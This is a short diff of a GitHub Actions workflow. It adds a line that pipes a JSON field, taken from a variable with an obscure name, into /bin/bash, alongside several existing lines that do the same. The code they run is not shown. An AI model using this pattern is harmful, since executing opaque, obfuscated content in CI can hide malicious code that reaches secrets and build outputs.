@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$m577" | jq -r .ia858 | /bin/bash
           printf '%s' "$ccwup051" | jq -r .umge4 | /bin/bash
           printf '%s' "$zytf7683" | jq -r .ajge524 | /bin/bash
+          echo $so0 | jq -r .rwy95 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
